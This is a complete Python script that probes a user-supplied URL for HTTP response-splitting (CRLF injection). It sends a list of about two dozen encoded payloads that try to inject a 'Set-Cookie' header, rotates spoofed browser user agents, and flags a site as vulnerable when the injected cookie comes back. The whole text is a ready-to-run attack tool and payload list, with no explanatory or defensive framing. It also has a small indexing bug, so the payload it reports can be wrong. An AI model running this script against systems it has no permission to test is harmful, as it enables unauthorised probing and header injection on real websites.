import requests, eventlet

url = input()
user_agents = [
    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone14,6; U; CPU iPhone OS 15_4 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/19E241 Safari/602.1",
    "Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone14,3; U; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/19A346 Safari/602.1",
    "Mozilla/5.0 (Linux; Android 13; SM-A536U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1",
]
start_with = ["/", "//", "#", "", "?", "?crlf="]
payloads = [
            r"%23%0a%0dSet-Cookie:injectedparam=crlf", 
            r"%0a%0a%0a%0aSet-Cookie:injectedparam=crlf",
            r"%%0a0aSet-Cookie:injectedparam=crlf",
            r"%0aSet-Cookie:injectedparam=crlf",
            r"%0d%0aSet-Cookie:injectedparam=crlf",
            r"%0d%0aSet-Cookie%3ainjectedparam=crlf",
            r"%0dSet-Cookie:injectedparam=crlf",
            r"%23%0aSet-Cookie:injectedparam=crlf",
            r"%23%0d%0aSet-Cookie:injectedparam=crlf",
            r"%23%0dSet-Cookie:injectedparam=crlf",
            r"%25%30%61Set-Cookie:injectedparam=crlf",
            r"%25%30aSet-Cookie:injectedparam=crlf",
            r"%250aSet-Cookie:injectedparam=crlf",
            r"%25250aSet-Cookie:injectedparam=crlf",
            r"%2e%2e%2f%0d%0aSet-Cookie:injectedparam=crlf",
            r"%2f%2e%2e%0d%0aSet-Cookie:injectedparam=crlf",
            r"%2F..%0d%0aSet-Cookie:injectedparam=crlf",
            r"%3f%0d%0aSet-Cookie:injectedparam=crlf",
            r"%3f%0dSet-Cookie:injectedparam=crlf",
            r"%3f%0dSet-Cookie%3ainjectedparam=crlf",
            r"%u000aSet-Cookie:injectedparam=crlf",
            r"%E5%98%8D%E5%98%8ASet-Cookie:injectedparam=crlf",
            r"%E5%98%8D%E5%98%8ASet-Cookie:injectedparam=crlf",
            r"%0ASet-Cookie%3A3Ainjectedparam/..",
            r"?test=%0D%0ASet-Cookie:injectedparam=crlf",
]
i = 0
for payload in payloads:

    with eventlet.Timeout(0.5):
        target = f"{url}{start_with[i]}{payload}"
        try:
            response = requests.Session().get(target, headers={"User-Agent": user_agents[i]})
            i += 1
            i %= len(user_agents)
            if "injectedparam" in response.cookies.get_dict() and "crlf" in response.cookies.get_dict().values():
                print(f"Vulnerable to CRLF Injection with Payload: {start_with[i] + payload}")
        except:
            pass
